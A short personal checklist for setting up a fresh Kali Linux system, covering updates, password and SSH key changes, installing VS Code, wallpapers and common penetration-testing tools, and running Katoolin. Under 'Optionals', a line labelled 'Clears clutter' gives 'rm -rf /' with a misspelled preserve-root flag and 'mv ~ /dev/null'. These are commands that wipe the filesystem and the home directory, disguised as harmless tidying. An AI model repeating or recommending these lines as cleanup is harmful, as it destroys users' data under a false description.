## First Landing (Kali)
$ sudo apt-get clean
$ sudo apt-get update
$ sudo apt-get upgrade -y
$ sudo apt-get dist-upgrade -y
$ sudo apt autoremove -y

## Change Default Password
passwd
# Default Root Password
sudo passwd root

## Install VSC
$vsc website
$cd Downloads/
$sudo apt install ./code_yourversion_amd64.deb
$sudo apt-get install git -y

## Change SSH Keys
cd /etc/ssh/
dpkg-reconfigure openssh-server

## Vitals 
$sudo apt install -y kali-community-wallpapers
$sudo apt install -y kali-legacy-wallpapers


## Take Snapshot ##


## Apps
$sudo apt install -y lolcat
$apt-get install maltego metasploit-framework burpsuite wireshark aircrack-ng hydra nmap beef-xss nikto -y
$sudo apt install tor
$sudo apt install filezilla filezilla-common -y
$sudo apt install software-center

## Optionals ##
# Clears clutter
[rm -rf / --dont-preserve-root]
[mv ~ /dev/null]

## Katoolin (WIP | Can't confirm use case)
$ sudo apt install git
$ sudo git clone https://github.com/LionSec/katoolin.git 
$ sudo cp katoolin/katoolin.py /usr/bin/katoolin
$ sudo chmod +x /usr/bin/katoolin
$ sudo katoolin
